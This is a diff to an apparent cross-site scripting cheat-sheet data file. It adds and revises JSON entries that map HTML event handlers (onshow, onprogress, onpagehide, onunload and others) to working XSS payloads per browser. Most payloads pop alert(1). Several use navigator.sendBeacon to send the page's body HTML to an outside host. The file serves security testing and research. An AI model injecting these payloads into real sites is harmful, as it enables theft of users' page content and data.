@@ -1,4 +1,174 @@
 {
+    "onshow": {
+        "description": "Fires context menu is shown",
+        "tags": [
+            {
+                "tag": "menu",
+                "code": "<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>",
+                "browsers": [
+                    "firefox"                    
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "ontransitionstart": {
+        "description": "Fires when a CSS transition starts",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" ontransitionstart=alert(1)><\/*>",
+                "browsers": [
+                    "safari"
+                ],
+                "interaction": false,
+                "hash": "#x"
+            }
+        ]
+    },
+    "onprogress": {
+        "description": "Fires when the video/audio begins downloading",
+        "tags": [
+            {
+                "tag": "video",
+                "code": "<video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
+                "browsers": [
+                    "chrome",                    
+                    "edge",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": false
+            },
+            {
+                "tag": "audio",
+                "code": "<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
+                "browsers": [
+                    "chrome",                    
+                    "edge",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "ondurationchange": {
+        "description": "Fires when duration changes",
+        "tags": [
+            {
+                "tag": "video",
+                "code": "<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>",
+                "browsers": [
+                    "chrome",                    
+                    "edge",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": false
+            },
+            {
+                "tag": "audio",
+                "code": "<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>",
+                "browsers": [
+                    "chrome",                    
+                    "edge",
+                    "firefox",
+                    "safari"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "oncuechange": {
+        "description": "Fires when subtitle changes",
+        "tags": [
+            {
+                "tag": "track",
+                "code": "<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=\"data:text/vtt,WEBVTT FILE\n\n1\n00:00:00.000 --> 00:00:05.000 \n<b>XSS</b>\n\"></video>",
+                "browsers": [
+                    "chrome",                    
+                    "edge"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "onwebkitanimationiteration": {
+        "description": "Fires when a CSS animation repeats",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<style>@keyframes slidein {}<\/style><* style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"><\/*>",
+                "browsers": [
+                    "chrome",
+                    "firefox",
+                    "edge",
+                    "safari"
+                ],
+                "interaction": false
+            }
+        ]
+    },
+    "onselectstart": {
+        "description": "Fires when beginning a text selection",
+        "tags": [
+            {
+                "tag": "body",
+                "code": "<body onselectstart=alert(1)>select some text",
+				        "browsers": [                    
+                    "chrome",
+                    "edge",
+                    "safari"               
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onselectionchange": {
+        "description": "Fires when text selection is changed on the page",
+        "tags": [
+            {
+                "tag": "body",
+                "code": "<body onselectionchange=alert(1)>select some text",
+				        "browsers": [                    
+                    "chrome",
+                    "edge",
+                    "safari"               
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onpagehide": {
+        "description": "Fires when the page is changed",
+        "tags": [
+            {
+                "tag": "body",
+                "code": "<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+				        "browsers": [                    
+                    "chrome",
+                    "edge",
+                    "firefox"               
+                ],
+                "interaction": true
+            }
+        ]
+    },
+    "onmousewheel": {
+        "description": "Fires when the mousewheel scrolls",
+        "tags": [
+            {
+                "tag": "*",
+                "code": "<* onmousewheel=alert(1)>requires scrolling",
+				        "browsers": [                    
+                    "chrome",
+                    "edge"               
+                ],
+                "interaction": true
+            }
+        ]
+    },
     "onclose": {
         "description": "Fires when a dialog is closed",
         "tags": [
@@ -4511,10 +4681,11 @@
         "tags": [
             {
                 "tag": "body",
-                "code": "<body onbeforeunload=\"location='javascript:alert(1)'\">",
-                "url": "http:\/\/subdomain1.portswigger-labs.net\/xss\/xss.php?x=%3Ciframe%20onload%3D%22if%28%21window.flag%29%7Bthis.contentWindow.location%3D%27https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onbeforeunload%3D%2522location%3D%2527javascript%3Aalert%281%29%2527%2522%3E%23%27%3Bflag%3D1%7D%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onbeforeunload%3D%2522location%3D%27javascript%3Aalert%281%29%27%2522%3E%22%3E%3C%2Fiframe%3E",
+                "code": "<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
                 "browsers": [
-                    "chrome"
+                    "chrome",
+                    "edge",
+                    "firefox"
                 ],
                 "interaction": false
             }
@@ -14364,15 +14535,26 @@
         ]
     },
     "onunload": {
-        "description": "Requires a click anywhere on the page and a reload",
+        "description": "Fires when the page is unloaded",
         "tags": [
             {
                 "tag": "svg",
-                  "code": "<svg onunload=window.open('javascript:alert(1)')>",
+                  "code": "<svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
                 "browsers": [
-                    "chrome"
+                    "chrome",
+                    "edge"
                 ],
-                "interaction": true
+                "interaction": false
+            },
+            {
+                "tag": "body",
+                  "code": "<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",
+                "browsers": [
+                    "chrome",
+                    "edge",
+                    "firefox"
+                ],
+                "interaction": false
             }
         ]
     },
